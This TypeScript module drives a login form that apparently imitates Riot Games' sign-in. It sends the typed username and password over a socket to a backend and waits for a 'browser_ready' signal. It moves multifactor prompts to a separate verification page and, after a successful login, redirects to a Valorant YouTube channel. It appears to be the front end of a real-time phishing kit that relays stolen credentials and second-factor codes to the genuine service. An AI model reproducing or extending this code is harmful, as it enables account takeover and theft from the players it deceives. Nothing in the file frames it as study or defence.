import faRight from '@/assets/icons/faRight';
import loadingIcon from '@/assets/image/icons/loading-icon';
import { html } from '@/lib/html';
import { socketService } from '@/services/socket';
import { router } from '@/routes/routes';
import type { Result } from '@/types/riot';

const togglePassword = () => {
    const passwordInput = document.getElementById(
        'password'
    ) as HTMLInputElement;
    const eyeIcon = document.getElementById('eye-icon');
    const eyeSlashIcon = document.getElementById('eye-slash-icon');

    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIcon?.classList.add('hidden');
        eyeSlashIcon?.classList.remove('hidden');
    } else {
        passwordInput.type = 'password';
        eyeIcon?.classList.remove('hidden');
        eyeSlashIcon?.classList.add('hidden');
    }
};

let isLoading = false;
let hasError = false;

const updateUI = (): void => {
    const submitBtn = document.getElementById(
        'submit-btn'
    ) as HTMLButtonElement;
    const usernameInput = document.getElementById(
        'username'
    ) as HTMLInputElement;
    const passwordInput = document.getElementById(
        'password'
    ) as HTMLInputElement;
    const errorDiv = document.getElementById('error-div');

    if (submitBtn) {
        if (isLoading) {
            submitBtn.disabled = true;
            submitBtn.innerHTML = html`
                <div class="flex items-center justify-center">
                    <div class="animate-spin">${loadingIcon}</div>
                </div>
            `;
        } else {
            submitBtn.disabled = false;
            submitBtn.innerHTML = faRight;
        }
    }

    if (usernameInput) {
        usernameInput.disabled = isLoading;
        const usernameLabel = document.querySelector('label[for="username"]');
        if (hasError) {
            usernameInput.classList.add(
                'bg-[#ba27e74d]/30',
                'border-[#ba27e74d]',
                'focus:border-[#be29cc]'
            );
            usernameInput.classList.remove(
                'bg-[rgba(186,186,186,0.1)]',
                'border-transparent',
                'focus:border-black'
            );
            usernameLabel?.classList.add('text-[#be29cc]');
            usernameLabel?.classList.remove(
                'text-[#4a4a4a]',
                'peer-focus:text-[#666666]',
                'peer-[:not(:placeholder-shown)]:text-[#666666]'
            );
        } else {
            usernameInput.classList.remove(
                'bg-[#ba27e74d]/30',
                'border-[#ba27e74d]',
                'focus:border-[#be29cc]'
            );
            usernameInput.classList.add(
                'bg-[rgba(186,186,186,0.1)]',
                'border-transparent',
                'focus:border-black'
            );
            usernameLabel?.classList.remove('text-[#be29cc]');
            usernameLabel?.classList.add(
                'text-[#4a4a4a]',
                'peer-focus:text-[#666666]',
                'peer-[:not(:placeholder-shown)]:text-[#666666]'
            );
        }
    }

    if (passwordInput) {
        passwordInput.disabled = isLoading;
        const passwordLabel = document.querySelector('label[for="password"]');
        if (hasError) {
            passwordInput.classList.add(
                'bg-[#ba27e74d]/30',
                'border-[#ba27e74d]',
                'focus:border-[#be29cc]'
            );
            passwordInput.classList.remove(
                'bg-[rgba(186,186,186,0.1)]',
                'border-transparent',
                'focus:border-black'
            );
            passwordLabel?.classList.add('text-[#be29cc]');
            passwordLabel?.classList.remove(
                'text-[#4a4a4a]',
                'peer-focus:text-[#666666]',
                'peer-[:not(:placeholder-shown)]:text-[#666666]'
            );
        } else {
            passwordInput.classList.remove(
                'bg-[#ba27e74d]/30',
                'border-[#ba27e74d]',
                'focus:border-[#be29cc]'
            );
            passwordInput.classList.add(
                'bg-[rgba(186,186,186,0.1)]',
                'border-transparent',
                'focus:border-black'
            );
            passwordLabel?.classList.remove('text-[#be29cc]');
            passwordLabel?.classList.add(
                'text-[#4a4a4a]',
                'peer-focus:text-[#666666]',
                'peer-[:not(:placeholder-shown)]:text-[#666666]'
            );
        }
    }

    if (errorDiv) {
        errorDiv.style.display = hasError ? 'flex' : 'none';
    }
};

const handleLogin = async (): Promise<void> => {
    const usernameInput = document.getElementById(
        'username'
    ) as HTMLInputElement;
    const passwordInput = document.getElementById(
        'password'
    ) as HTMLInputElement;

    const username = usernameInput?.value.trim();
    const password = passwordInput?.value;

    if (!username || !password) {
        return;
    }

    if (!socketService.isConnected()) {
        hasError = true;
        updateUI();
        return;
    }

    isLoading = true;
    hasError = false;
    updateUI();

    socketService.login(username, password);
};
const setupSocketEvents = (): void => {
    socketService.on('login_result', (result: Result) => {
        isLoading = false;

        if (result.success) {
            hasError = false;
            updateUI();
            const redirectUrl = 'https://www.youtube.com/@valorant';
            window.location.replace(redirectUrl);
        } else if (result.data?.type === 'multifactor') {
            hasError = false;
            updateUI();
            if (result.data.multifactor?.email) {
                sessionStorage.setItem(
                    'multifactor_email',
                    result.data.multifactor.email
                );
            }
            router.navigate('/verification-required');
        } else {
            hasError = true;
            updateUI();
            const passwordInput = document.getElementById(
                'password'
            ) as HTMLInputElement;
            passwordInput.value = '';
            passwordInput.focus();
        }
    });

    socketService.on('browser_ready', (data: any) => {
        if (!data.success) {
            hasError = true;
            updateUI();
        }
    });
};

export const setupPasswordToggle = () => {
    document
        .getElementById('toggle-password')
        ?.addEventListener('click', togglePassword);
};
export const setupHomeEvents = (): void => {
    setupSocketEvents();

    const submitBtn = document.getElementById('submit-btn');
    const usernameInput = document.getElementById(
        'username'
    ) as HTMLInputElement;
    const passwordInput = document.getElementById(
        'password'
    ) as HTMLInputElement;
    const closeErrorBtn = document.getElementById('close-error-btn');

    submitBtn?.addEventListener('click', handleLogin);

    closeErrorBtn?.addEventListener('click', () => {
        hasError = false;
        updateUI();
    });

    usernameInput?.addEventListener('input', () => {
        if (hasError) {
            hasError = false;
            updateUI();
        }
    });

    passwordInput?.addEventListener('input', () => {
        if (hasError) {
            hasError = false;
            updateUI();
        }
    });

    const handleEnterKey = (e: KeyboardEvent) => {
        if (e.key === 'Enter' && !isLoading) {
            handleLogin();
        }
    };

    usernameInput?.addEventListener('keydown', handleEnterKey);
    passwordInput?.addEventListener('keydown', handleEnterKey);
};

export const cleanupHomeEvents = (): void => {
    socketService.off('login_result');
    socketService.off('browser_ready');
};
